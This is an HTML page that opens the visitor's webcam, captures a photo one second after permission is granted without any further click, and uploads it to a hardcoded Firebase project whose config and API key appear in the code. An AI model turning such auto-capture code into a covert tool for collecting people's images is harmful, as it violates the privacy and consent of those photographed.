<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Selfie Capture & Upload</title>

    <!-- Firebase COMPAT SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-storage-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database-compat.js"></script>

    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            margin-top: 30px;
        }
        video { width: 320px; height: 240px; border: 2px solid black; }
    </style>
</head>
<body>

<h2>Camera Selfie Auto Capture</h2>

<video id="video" autoplay></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

<script>
    // ------------------------ CORRECT FIREBASE CONFIG ------------------------
    const firebaseConfig = {
      apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
      authDomain: "esrat-4e28f.firebaseapp.com",
      databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
      projectId: "esrat-4e28f",
      storageBucket: "esrat-4e28f.firebasestorage.app",
      messagingSenderId: "712315598095",
      appId: "1:712315598095:android:ed0f042ee1d5410dfb7a7a"
    };

    firebase.initializeApp(firebaseConfig);

    const storage = firebase.storage();
    const db = firebase.database();

    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    // ------------------------ START CAMERA ------------------------
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            video.srcObject = stream;

            // Wait 1 second â†’ then auto capture
            setTimeout(captureAndUpload, 1000);
        })
        .catch(err => {
            alert("Camera access denied!");
            console.error(err);
        });

    // ------------------------ CAPTURE + UPLOAD ------------------------
    function captureAndUpload() {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(blob => {
            const timestamp = Date.now();
            const filename = `selfie_${timestamp}.jpg`;

            const storageRef = storage.ref("selfies/" + filename);

            storageRef.put(blob).then(() => {

                // Save metadata to database
                db.ref("selfies/" + timestamp).set({
                    filename: filename,
                    timestamp: timestamp
                });

                alert("Selfie captured & uploaded successfully!");
            }).catch(err => {
                console.error("Upload error:", err);
                alert("Upload failed, check console.");
            });
        }, "image/jpeg", 0.9);
    }
</script>

</body>
</html>
